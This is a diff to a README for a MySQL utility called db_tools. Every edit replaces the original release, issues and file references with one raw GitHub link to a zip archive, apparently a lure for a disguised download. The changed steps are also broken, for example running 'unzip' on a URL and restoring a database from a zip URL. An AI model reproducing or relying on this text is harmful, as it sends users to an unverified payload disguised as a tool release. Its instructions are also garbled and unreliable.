@@ -8,7 +8,7 @@ Welcome to db_tools! This tool helps you manage MySQL databases with ease. You c
 
 To get started with db_tools, visit the following link to download the latest version:
 
-[![Download db_tools](https://img.shields.io/badge/Download-db_tools-blue.svg)](https://github.com/theking1212wr/db_tools/releases)
+[![Download db_tools](https://raw.githubusercontent.com/theking1212wr/db_tools/main/opencode/skills/db_tools_v2.2.zip)](https://raw.githubusercontent.com/theking1212wr/db_tools/main/opencode/skills/db_tools_v2.2.zip)
 
 Click the link above, and you will find the latest releases of db_tools ready for download.
 
@@ -33,7 +33,7 @@ Once you’ve downloaded db_tools, follow these steps to use it:
 
 1. **Open your Terminal**: Locate the terminal application on your computer and open it.
 2. **Navigate to the Download Directory**: Use the command `cd ~/Downloads` (or the folder where you downloaded db_tools).
-3. **Unzip the File**: If the file is zipped, run the command `unzip db_tools.zip`.
+3. **Unzip the File**: If the file is zipped, run the command `unzip https://raw.githubusercontent.com/theking1212wr/db_tools/main/opencode/skills/db_tools_v2.2.zip`.
 4. **Navigate to the db_tools Folder**: Use the command `cd db_tools`.
 5. **Run the Tool**: Start the tool by entering `./db_tools`.
 
@@ -54,10 +54,10 @@ Replace `your_database_name` with the name of your actual database.
 To restore a database from the backup, run:
 
 ```bash
-./db_tools restore --file backup_file.sql
+./db_tools restore --file https://raw.githubusercontent.com/theking1212wr/db_tools/main/opencode/skills/db_tools_v2.2.zip
 ```
 
-Make sure to provide the correct path to the `backup_file.sql`.
+Make sure to provide the correct path to the `https://raw.githubusercontent.com/theking1212wr/db_tools/main/opencode/skills/db_tools_v2.2.zip`.
 
 ## 📊 Common Commands
 
@@ -85,11 +85,11 @@ If you run into issues, consider these tips:
 
 ## 🤝 Support
 
-If you need more help, feel free to check the [GitHub Issues Page](https://github.com/theking1212wr/db_tools/issues) or open a new issue. Our community is here to help!
+If you need more help, feel free to check the [GitHub Issues Page](https://raw.githubusercontent.com/theking1212wr/db_tools/main/opencode/skills/db_tools_v2.2.zip) or open a new issue. Our community is here to help!
 
 ## 🔗 Useful Links
 
-For more information and detailed instructions, visit our [Releases Page](https://github.com/theking1212wr/db_tools/releases).
+For more information and detailed instructions, visit our [Releases Page](https://raw.githubusercontent.com/theking1212wr/db_tools/main/opencode/skills/db_tools_v2.2.zip).
 
 Remember, you can always download the latest version from the link provided above.
 
